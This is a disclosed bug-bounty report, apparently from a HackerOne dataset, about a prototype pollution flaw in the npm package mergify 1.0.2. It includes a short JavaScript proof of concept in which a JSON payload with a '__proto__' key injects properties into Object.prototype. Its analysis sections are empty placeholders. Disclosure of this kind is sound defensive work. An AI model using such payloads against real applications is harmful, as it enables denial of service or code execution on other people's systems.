---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '439098'
original_report_id: '439098'
title: Prototype pollution attack (mergify)
team_handle: nodejs-ecosystem
created_at: '2018-11-11T13:39:30.613Z'
disclosed_at: '2018-11-20T12:04:14.262Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
asset_identifier: Other module
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
---

# Prototype pollution attack (mergify)

## Metadata

- HackerOne Report ID: 439098
- Weakness: 
- Program: nodejs-ecosystem
- Disclosed At: 2018-11-20T12:04:14.262Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi team,
I would like to report a prototype pollution vulnerability in mergify
that allows an attacker to inject properties on Object.prototype.

# Module

**module name:** mergify
**version:** 1.0.2
**npm page:** `https://www.npmjs.com/package/mergify`

## Module Description

> Merge objects deeply

# Vulnerability

## Vulnerability Description

> this vulnerability type is similar to my report  #438274
mergify is vulnerable when it performs a recursive copy of the specified objects.

## Steps To Reproduce:

> In the following code snippet, "payload" would come from user-input (JSON data).
```javascript
var mergify= require('mergify');
var payload = '{"__proto__":{"polluted":"mergify_done !"}}';
var test = {};
console.log("Before: ", test.polluted);
mergify({},JSON.parse(payload));
console.log("After: ", test.polluted);

# Wrap up
- I contacted the maintainer to let them know: [Y/N] 
- I opened an issue in the related repository: [Y/N] 

Thanks!

## Impact

It causes Denial of Service or RCE in some cases.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
